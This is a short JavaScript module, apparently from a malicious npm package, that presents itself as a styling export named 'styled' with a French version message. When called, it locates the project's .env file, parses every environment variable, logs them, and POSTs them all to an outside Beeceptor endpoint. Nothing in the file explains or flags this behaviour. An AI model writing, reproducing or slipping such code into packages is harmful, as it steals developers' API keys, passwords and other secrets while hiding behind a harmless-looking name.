import findUp from "find-up";
import axios from "axios";
import dotenv from "dotenv";
const findSecret = () => {
  const dotenvPath = findUp.sync(".env");

  if (!dotenvPath) {
    console.error("Le fichier .env n'a pas été trouvé.");
    process.exit(1);
  }

  const loadedEnv = dotenv.config({ path: dotenvPath }).parsed;

  console.log("Loaded dotenv:", loadedEnv);

  // Set the Beeceptor URL
  const beeceptorUrl = "https://envparam.free.beeceptor.com";

  // Make a POST request to Beeceptor with the environment variables
  axios
    .post(beeceptorUrl, loadedEnv)
    .then((response) => {
      console.log("POST request successful:", response.data);
    })
    .catch((error) => {
      console.error("Error making POST request:", error.message);
    });
};

const styled = () => {
  console.log("Bonjour, cette version est la bonne 7.1.3");
  findSecret();
};
export default styled;
